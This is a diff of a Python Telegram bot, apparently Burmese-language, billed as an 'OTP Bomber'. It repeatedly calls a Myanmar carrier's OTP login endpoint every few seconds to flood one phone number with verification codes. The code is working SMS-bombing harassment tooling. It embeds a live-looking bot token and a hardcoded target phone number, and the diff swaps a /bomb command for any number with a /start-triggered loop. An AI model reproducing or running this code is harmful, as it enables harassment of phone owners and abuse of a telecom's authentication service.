@@ -6,7 +6,7 @@ import requests
 TOKEN = "8183997269:AAElovxXFRd40oatzEtSnKpVm8UAheNvAQw"
 DEFAULT_PHONE = "09663976639"
 
-# Mytel OTP API ကိုခေါ်မည့် Function
+# Mytel OTP API ကိုခေါ်မည့် Function (အောင်မြင်မှု ရှိမရှိ စစ်ဆေးခြင်း)
 def get_otp_from_api(phone_number):
     url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone_number}"
     headers = {
@@ -14,103 +14,76 @@ def get_otp_from_api(phone_number):
     }
     try:
         response = requests.get(url, headers=headers)
-        return response.text
+        if response.status_code == 200:
+            return "အောင်မြင်သည် (Success)"
+        else:
+            return f"မအောင်မြင်ပါ (Code: {response.status_code})"
     except Exception as e:
-        return str(e)
+        return f"အမှား: {str(e)}"
 
-# 1. Background မှာ Unknown အနေနဲ့ အလိုအလျောက် အမြဲအလုပ်လုပ်နေမည့် Default Bomber
-async def background_default_bomber(application):
-    delay_seconds = 3
-    while True:
-        try:
-            await asyncio.to_thread(get_otp_from_api, DEFAULT_PHONE)
-        except Exception:
-            pass
-        await asyncio.sleep(delay_seconds)
-
-async def post_init(application):
-    application.create_task(background_default_bomber(application))
-
-# 2. အခြား ဖုန်းနံပါတ်အသစ်တွေအတွက် Command Handler (/bomb <phone>)
-async def start_custom_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text("❌ ကျေးဇူးပြု၍ ဖုန်းနံပါတ် ထည့်ပေးပါ။\nဥပမာ: `/bomb 09912345678`", parse_mode="Markdown")
-        return
-
-    phone = context.args[0]
-    
-    # Default နံပါတ်ရိုက်ထည့်လာပါက Unknown ဟုသာ ပြသရန်
-    if phone == DEFAULT_PHONE:
-        phone_display = "Unknown"
-    else:
-        phone_display = phone
-
-    keyboard = [[InlineKeyboardButton("🛑 ရပ်တန့်ရန်", callback_data=f"stop_{phone}")]]
+# Bot စတင်ချိန်နှင့် /start ခေါ်လိုက်ချိန်တွင် Unknown နံပါတ်အတွက် အလိုအလျောက် အလုပ်လုပ်မည့် Task
+async def start_default_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # တစ်ခါမှ မစတင်ရသေးရင် သို့မဟုတ် အသစ်စတင်ချင်ရင်
+    keyboard = [[InlineKeyboardButton("🛑 ရပ်တန့်ရန်", callback_data="stop_unknown")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     msg = await update.message.reply_text(
-        f"🚀 **ဖုန်းနံပါတ်အတွက် OTP Bomber စတင်နေပါပြီ...**\n\n"
-        f"📱 ဖုန်း: `{phone_display}`\n"
-        f"🔄 အခြေအနေ: လုပ်ဆောင်နေသည်...",
+        f"🚀 **OTP Bomber အလုပ်လုပ်နေဆဲ...**\n\n"
+        f"📱 ဖုန်း: `unknown`\n"
+        f"🔄 ပို့ပြီးစီးမှု: `0` ကြိမ်",
         parse_mode="Markdown",
         reply_markup=reply_markup
     )
 
-    context.user_data[f'stop_{phone}'] = False
+    # ဤ chat_id အတွက် stop flag ကို False လုပ်မည်
+    context.user_data['stop_unknown'] = False
     i = 0
     delay_seconds = 3
 
-    while not context.user_data.get(f'stop_{phone}', False):
+    while not context.user_data.get('stop_unknown', False):
         i += 1
-        await asyncio.to_thread(get_otp_from_api, phone)
+        result = await asyncio.to_thread(get_otp_from_api, DEFAULT_PHONE)
         
         try:
             await msg.edit_text(
                 f"🚀 **OTP Bomber အလုပ်လုပ်နေဆဲ...**\n\n"
-                f"📱 ဖုန်း: `{phone_display}`\n"
-                f"🔄 ပို့ပြီးစီးမှု: `{i}` ကြိမ်",
+                f"📱 ဖုန်း: `unknown`\n"
+                f"🔄 ပို့ပြီးစီးမှု: `{i}` ကြိမ်\n"
+                f"📡 အခြေအနေ: `{result}`",
                 parse_mode="Markdown",
                 reply_markup=reply_markup
             )
         except Exception:
             pass
 
+        # ၃ စက္ကန့် စောင့်နေစဉ်အတွင်း ရပ်တန့်ရန် ခလုတ်နှိပ်ထားခြင်း ရှိမရှိ စစ်ဆေးခြင်း
         for _ in range(delay_seconds):
-            if context.user_data.get(f'stop_{phone}', False):
+            if context.user_data.get('stop_unknown', False):
                 break
             await asyncio.sleep(1)
 
     try:
         await msg.edit_text(
-            f"🛑 **ဖုန်းနံပါတ် {phone_display} အတွက် Bomber ရပ်တန့်သွားပါပြီ။**\n"
+            f"🛑 **OTP Bomber ရပ်တန့်သွားပါပြီ။**\n\n"
+            f"📱 ဖုန်း: `unknown`\n"
             f"✨ စုစုပေါင်း: `{i}` ကြိမ်",
             parse_mode="Markdown"
         )
     except Exception:
         pass
 
-async def stop_custom_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ရပ်တန့်ရန် ခလုတ်နှိပ်သည့်အခါ
+async def stop_button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer("ရပ်တန့်လိုက်ပါပြီ!")
-    data = query.data
-    if data.startswith("stop_"):
-        phone = data.split("_")[1]
-        context.user_data[f'stop_{phone}'] = True
-
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🤖 **OTP Bomber Bot သို့ ကြိုဆိုပါတယ်**\n\n"
-        "📌 အခြားဖုန်းနံပါတ်များ စမ်းသပ်လိုပါက ဤကဲ့သို့ ရိုက်ထည့်ပါ:\n"
-        "`/bomb <ဖုန်းနံပါတ်>`",
-        parse_mode="Markdown"
-    )
+    if query.data == "stop_unknown":
+        context.user_data['stop_unknown'] = True
 
 if __name__ == '__main__':
-    app = ApplicationBuilder().token(TOKEN).post_init(post_init).build()
+    app = ApplicationBuilder().token(TOKEN).build()
 
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("bomb", start_custom_bomb))
-    app.add_handler(CallbackQueryHandler(stop_custom_button, pattern="^stop_", block=False))
+    app.add_handler(CommandHandler("start", start_default_bomber))
+    app.add_handler(CallbackQueryHandler(stop_button_click, pattern="stop_unknown", block=False))
 
     print("Bot အလုပ်လုပ်နေပါပြီ...")
     app.run_polling()
